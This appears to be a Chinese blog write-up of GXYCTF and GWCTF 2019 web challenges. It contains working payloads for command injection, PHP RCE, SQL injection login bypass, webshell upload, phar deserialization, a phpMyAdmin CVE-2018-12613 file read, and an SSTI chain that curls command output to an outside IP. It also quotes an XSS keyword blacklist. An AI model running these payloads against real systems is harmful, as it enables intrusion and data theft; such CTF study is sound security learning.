    <content><![CDATA[<h1 id="GXYCTF-2019"><a href="#GXYCTF-2019" class="headerlink" title="GXYCTF 2019"></a>GXYCTF 2019</h1><h3 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h3><p>进入题目后，提示了  <code>/?ip=</code>，于是加上参数 <code>?ip=1</code>试试看，发现是执行了ping命令：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200219225729621.png" alt="在这里插入图片描述"><br>然后尝试：<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">ip</span>=;ls</span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200219225758362.png" alt="在这里插入图片描述"><br>发现成功执行了命令，但是当读取 flag.php 时，发现过了空格，尝试下面两种绕过方式<br><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$&#123;IFS&#125;</span></span><br><span class="line"><span class="variable">$IFS</span><span class="variable">$9</span></span><br></pre></td></tr></table></figure></p>
<p>使用第二个<code>$IFS$9</code>代替空格成功绕过，执行 <code>?ip=;cat$IFS$9flag.php</code>，发现 flag 也被过滤了，且通配符 <code>*</code> 同样被过滤了，那我们先读一下 <code>index.php</code>：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200219230131415.png" alt="在这里插入图片描述">可以看到源码，的确过滤了一些特殊符号、空格和flag，下面有两种方式可以绕过：</p>
<p>（1）可以使用变量的方式来绕过，只要 f、l、a、g 四个字母不按照顺序即可，payload如下：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">?ip=;z=<span class="keyword">g</span>;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$9fla</span><span class="variable">$z</span>.php</span><br></pre></td></tr></table></figure>
<p>（2）我们发现代码中没有过滤反引号，那么可以内联执行命令，即用反引号内执行的输出作为另一个命令的输入执行，payload如下：</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">?ip=;<span class="keyword">cat</span><span class="variable">$IFS</span><span class="variable">$9</span>`<span class="keyword">ls</span>`</span><br></pre></td></tr></table></figure>
<p>flag在源码中：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200219230600490.png" alt="在这里插入图片描述"><br></p>
<h3 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h3><p>扫目录发现.git泄露，利用GitHack得到index.php源码如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>看到过滤部分可以看出是关于 PHP 的无参数RCE/读文件，可以参考我之前分析的 <a href="https://blog.csdn.net/qq_42181428/article/details/100659865" target="_blank" rel="noopener">ByteCTF_2019 BoringCode</a></p>
<p>源码可以看出 flag.php 就在当前目录，不需要再跳转目录，于是使用如下payload列一下文件：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">exp</span>=print_r(scandir(<span class="keyword">pos</span>(localeconv())));</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220000548989.png" alt="在这里插入图片描述"><br>这里的flag.php不在最后一个，所以不能像ByteCTF那一题一样直接用 <code>end()</code> 函数，但是这一题并没有过滤下划线 <code>_</code>，于是可操作性又增加了。</p>
<p>我们可以使用 <code>array_reverse()</code> 函数反转数组，这样 <code>flag.php</code> 就在第二个位置了，然后使用 <code>next()</code> 函数即可取到，payload如下：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">exp</span>=readfile(<span class="keyword">next</span>(array_reverse(scandir(<span class="keyword">pos</span>(localeconv())))));</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220000825981.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h3 id="BabySQli"><a href="#BabySQli" class="headerlink" title="BabySQli"></a>BabySQli</h3><p>随手测试，通过回显可以发现存在 admin 账号，应该是通过注入登录 admin 账号，同时得到一段提示，先base32再base64如下：<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure></p>
<p>尝试一般的万能密码，发现被过滤了，既然提示了我们sql语句，那么肯定是要根据sql语句来构造，于是猜测：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">根据用户名查询到用户信息：$user = <span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span>;</span><br><span class="line">然后判断：$user-&gt;password === md5($password);</span><br></pre></td></tr></table></figure>
<p>并且通过union联合注入测试出有3列，猜测为 <code>id,username,password</code>，于是可以尝试如下payload：</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line">name=<span class="number">-1'</span> union <span class="keyword">select</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'c4ca4238a0b923820dcc509a6f75849b'</span><span class="meta">#&amp;pw=1</span></span><br></pre></td></tr></table></figure>
<p>上面的意思就是：-1不存在，联合查询的结果会是后面我们构造的 <code>1, &#39;admin&#39;, &#39;c4ca4238a0b923820dcc509a6f75849b&#39;</code>，正好对应的数据库中的三列，也就构造了一个密码可控的admin用户返回。这里的md5值实际上也就是我们后面填在密码框中的任意密码。（md(1)=c4ca4238a0b923820dcc509a6f75849b）</p>
<p>从而实现了任意密码登录，可以得到flag：</p>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220004941525.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h3 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h3><p>进入题目后，直接是一个上传页面，经过测试发现：</p>
<ul>
<li>过滤了MIME只能为：<code>image/jpeg</code></li>
<li>黑名单过滤了文件后缀不能为php</li>
<li>过滤了文件内容中的php标签，可以使用 <code>&lt;script language=&#39;php&#39;&gt;&lt;/script&gt;</code>绕过</li>
</ul>
<p>于是我们修改 MIME 上传 .htaccess 文件：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220171631159.png" alt="在这里插入图片描述"></p>
<p>然后上传 shell.jpg 如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220171658349.png" alt="在这里插入图片描述"><br>注：这里网上有的wp说原题要条件竞争，但是我在buu上复现的时候好像不需要…</p>
<p>两个文件上传后便可以成功访问并执行代码：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/2020022017184011.png" alt="在这里插入图片描述"><br>在 disabled_functions 中禁用了系统函数，那么我们直接读文件就好了，先列目录：<br><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=print_r(scandir(<span class="string">'/'</span>));</span></span><br></pre></td></tr></table></figure></p>
<p>读文件：<br><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=readfile(<span class="string">'/flag'</span>);</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220172014685.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h3 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0"></a>BabysqliV3.0</h3><p>首先是一个登录，使用弱密码 <code>admin/password</code> 即可成功登录，登陆后如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220173341333.png" alt="在这里插入图片描述"></p>
<p>且url中有 <code>?file=upload</code> 参数，于是尝试文件包含:</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=upload</span><br></pre></td></tr></table></figure>
<p>得到 upload.php 源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">		$ext = <span class="string">".txt"</span>;</span><br><span class="line">		@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'  '</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123; <span class="comment">//phar</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>]; <span class="comment">//文件名可控</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">"[^a-z0-9]"</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('illegal filename!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>($file[<span class="string">'size'</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('you are too big (′▽`〃)');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">"move_uploaded_file('"</span>.$file[<span class="string">'tmp_name'</span>].<span class="string">"', '"</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">"');"</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $sandbox;</span><br><span class="line">		<span class="keyword">global</span> $ext;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">	$uploader = <span class="keyword">new</span> Uploader();</span><br><span class="line">	$uploader-&gt;upload($_FILES[<span class="string">"file"</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents($uploader))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"下面是你上传的文件：&lt;br&gt;"</span>.$uploader.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents($uploader);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h5 id="解法一（非预期解）"><a href="#解法一（非预期解）" class="headerlink" title="解法一（非预期解）"></a>解法一（非预期解）</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123; </span><br><span class="line">	<span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>]; <span class="comment">//文件名可控</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由上面的代码可以看到文件名我们是可以通过 name 参数传入的，虽然经过了过滤，但是这里的正则写的有问题，都多匹配了空格，所以等于没有过滤任何东西，导致了非预期。</p>
<p>中一种就是直接上传shell，然后通过参数name修改文件名问php文件，直接访问即可。<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220195949176.png" alt="在这里插入图片描述"><br>然后：<br><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=system(<span class="string">'cat ../../flag.php'</span>);</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220200038384.png" alt="在这里插入图片描述"></p>
<h5 id="解法二（phar反序列化）"><a href="#解法二（phar反序列化）" class="headerlink" title="解法二（phar反序列化）"></a>解法二（phar反序列化）</h5><p>实际上这道题的预期解是通过phar反序列化，也就是利用了 file_get_contents() 函数来实现反序列化。</p>
<p><code>file_get_contents()</code> 函数的参数是 <code>Uploader()</code> 类的一个对象，因此作为参数时会调用它的 <code>__toString()</code> 方法从而返回 <code>$this-&gt;Filename</code>，而这个 <code>Filename</code> 是我们可控的。</p>
<p>还注意到上传文件的默认文件名是用 <code>$_SESSION[&#39;user&#39;]</code>设置，因此我们随意上传一个文件就可以得到token的值了。</p>
<p>脚本如下：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $Filename;</span><br><span class="line">	<span class="keyword">public</span> $cmd;</span><br><span class="line">	<span class="keyword">public</span> $token;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = <span class="string">"readfile('./flag.php')"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="string">"GXYc9a4bf152e1373381102b95a440f4968"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">    $o = <span class="keyword">new</span> Uploader;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); </span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); </span><br><span class="line">    $phar-&gt;setMetadata($o); </span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); </span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>将得到的phar文件上传得到路径：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220205115948.png" alt="在这里插入图片描述"><br>然后再次上传文件并加上参数 name 从而除法phar发序列化：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220205146715.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h3 id="StrongestMind"><a href="#StrongestMind" class="headerlink" title="StrongestMind"></a>StrongestMind</h3><p>进入页面后，发现如下算式：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220205428175.png" alt="在这里插入图片描述"><br>看来需要写个脚本提交一千次正确答案，脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">"http://289777ed-2c71-46ec-ad64-00ba9f0b09e6.node3.buuoj.cn/index.php"</span></span><br><span class="line"></span><br><span class="line">r = s.post(url)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count != <span class="number">1001</span>:</span><br><span class="line">    expr = re.search(<span class="string">r"(\d+)( \+ | - )(\d+)"</span>, r.text).group()</span><br><span class="line">    answer = eval(expr)</span><br><span class="line">    data = &#123;<span class="string">"answer"</span>: answer&#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    count = count + <span class="number">1</span></span><br><span class="line">    print(count)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
<p>中间用While循环来提交请求是因为在 BUUCTF 平台上面跑的，没隔一段时间就会返回一次404好像…原题应该没必要这样</p>
<p>结果如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200220215520729.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h1 id="GWCTF-2019"><a href="#GWCTF-2019" class="headerlink" title="GWCTF 2019"></a>GWCTF 2019</h1><h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>扫描目录可以发现 phpadmin，经过搜索，这里是CVE-2018-12613，可以直接使用vulhub里的poc：<a href="https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/phpmyadmin/</span>?target=db_sql.php%<span class="number">253</span>f<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200223180137503.png" alt="在这里插入图片描述"><br>成功包含，然后直接读取根目录下的/flag，即可：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200223180213855.png" alt="在这里插入图片描述"></p>
<p><br></p>
<h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>进入题目后，让猜字符串，通过js代码可以看到结果是发送的check.php，访问如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200223180534106.png" alt="在这里插入图片描述"><br>代码审计发现这里是考php的随机数种子爆破，参考2018SWPUCTF的一题：<a href="https://xz.aliyun.com/t/3656#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-3</a></p>
<p>先使用如下脚本转换随机数：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2 = <span class="string">'aefhPEHpRX'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">' '</span> + str(j) + <span class="string">' '</span> + <span class="string">'0'</span> + <span class="string">' '</span> + str(len(str1)<span class="number">-1</span>) + <span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure></p>
<p>得到:<br><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">4</span> <span class="number">4</span> <span class="number">0</span> <span class="number">61</span> <span class="number">5</span> <span class="number">5</span> <span class="number">0</span> <span class="number">61</span> <span class="number">7</span> <span class="number">7</span> <span class="number">0</span> <span class="number">61</span> <span class="number">51</span> <span class="number">51</span> <span class="number">0</span> <span class="number">61</span> <span class="number">40</span> <span class="number">40</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> </span><br><span class="line"><span class="number">15</span> <span class="number">15</span> <span class="number">0</span> <span class="number">61</span> <span class="number">53</span> <span class="number">53</span> <span class="number">0</span> <span class="number">61</span> <span class="number">59</span> <span class="number">59</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure></p>
<p>然后理由<a href="http://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php-mt-seed</a>工具，进行爆破种子如下：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200224095715256.png" alt="在这里插入图片描述"><br>然后再用得到的种子生成题目中要求的随机数即可：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">50222027</span>);</span><br><span class="line">$str_long1 = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>;</span><br><span class="line">$str = <span class="string">''</span>;</span><br><span class="line">$len1 = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len1; $i++) &#123;</span><br><span class="line">    $str .= substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200224095812106.png" alt="在这里插入图片描述"><br><br></p>
<h3 id="你的名字"><a href="#你的名字" class="headerlink" title="你的名字"></a>你的名字</h3><p>进入题目后输入名字会进行回显，虽然是index.php的路由，但是从返回头可以看出是python的后端，那么就很想是SSTI了：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/2020030300064278.png" alt="在这里插入图片描述"><br>经过测试，过滤了{{}}，只要使用就会报错，既然只能使用{% %}语句，那么很显然就需要盲注，我们构造payload如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].os.system(<span class="string">'执行的命令'</span>) %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></p>
<p>但是经过测试，<code>if</code>、<code>os</code>、<code>class</code>、<code>mro</code> 这些关键词会被替换为空，发现<code>config</code>也会被替换为空，这样我们就可以使用<code>iconfigf</code>、<code>oconfigs</code>的方式进行绕过，我们可以利用curl命令将执行结果带出（在BUUCTF里开一台内网的主机来操作），payload如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__clconfigass__.__mconfigro__[<span class="number">2</span>].__subclaconfigsses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].oconfigs.system(<span class="string">'curl http://174.0.225.32/?a=`ls \|base64`'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303001532647.png" alt="在这里插入图片描述"><br>然后再读flag即可：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__clconfigass__.__mconfigro__[<span class="number">2</span>].__subclaconfigsses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'linecache'</span>].oconfigs.system(<span class="string">'curl http://174.0.225.32/?a=`cat /flag_1s_Hera|base64`'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/20200303001628802.png" alt="在这里插入图片描述"><br><br></p>
<h3 id="mypassword"><a href="#mypassword" class="headerlink" title="mypassword"></a>mypassword</h3><p>进入题目后，先注册一个账号并登录：<br><img src="/2020/03/03/GXYCTF2019-GWCTF2019——Writeup/2020030315550142.png" alt="在这里插入图片描述"><br>只有两个功能，在FeedBack页面提交反馈和在List页面列出并查看已提交的反馈（List页面虽然有id参数，但是根据测试和提示，判断并无SQL注入）。</p>
<p>在FeedBack页面查看源码，可以看到如下提示：<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array($feedback))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('反馈不合法');&lt;/script&gt;"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">$blacklist = [<span class="string">'_'</span>,<span class="string">'\''</span>,<span class="string">'&amp;'</span>,<span class="string">'\\'</span>,<span class="string">'#'</span>,<span class="string">'%'</span>,<span class="string">'input'</span>,<span class="string">'script'</span>,<span class="string">'iframe'</span>,<span class="string">'host'</span>,<span class="string">'onload'</span>,<span class="string">'onerror'</span>,<span class="string">'srcdoc'</span>,<span class="string">'location'</span>,<span class="string">'svg'</span>,<span class="string">'form'</span>,<span class="string">'img'</span>,<span class="string">'src'</span>,<span class="string">'getElement'</span>,<span class="string">'document'</span>,<span class="string">'cookie'</span>];</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $val) &#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(stripos($feedback,$val) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">			$feedback = str_ireplace($val,<span class="string">""</span>,$feedback);</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>过滤了很多字符，但是经过测试，绕过思路与你的名字那题类似，即在关键词中间插入cookie进行绕过，如使用 scricookiept 绕过 script 的过滤。</p>
